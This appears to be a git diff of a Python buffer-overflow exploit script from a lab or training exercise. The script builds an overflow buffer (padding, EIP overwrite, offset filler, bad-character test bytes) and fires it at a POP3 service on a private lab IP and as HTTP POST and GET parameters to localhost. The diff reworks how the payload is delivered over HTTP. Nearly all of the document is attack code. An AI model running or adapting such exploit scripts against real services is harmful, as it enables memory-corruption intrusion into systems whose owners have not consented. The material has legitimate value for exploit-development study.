@@ -21,12 +21,10 @@ offset = "C" * 4
 
 buffer = padding + eip + offset + badchars
 
-content = "username=" + buffer + "&password=A"
-
 try:
     print("\nSending...")
     sendSocket('192.168.119.1', 110, buffer)
-    sendHttpReq('http://localhost:8080')
+    sendHttpReq('http://localhost:8080', buffer)
 
 def sendSocket(ip: str, port: int, buffer: bytes):
     import socket
@@ -45,13 +43,14 @@ def sendHttpReq(url: str, buffer: bytes):
     rawStr = buffer.decode('latin-1')
       # b'\x90' -> '\x90'
 
-    data = {'key': rawStr}
+    data = {'key': rawStr, 'password': 'A'}
     resPost = requests.post(url, data=data)
     url = 'http://localhost:8083'
-      # TODO careful with the encoding
+      # TODO be careful with the encoding
 
     resGet = requests.get(url, params=data)
-      # "GET /?key=%C2%90 HTTP/1.1"
+      # "GET /?key=%C2%90&password=A HTTP/1.1"
+
     print(resGet.url)
     print(resGet.text)
     print(resGet.content)
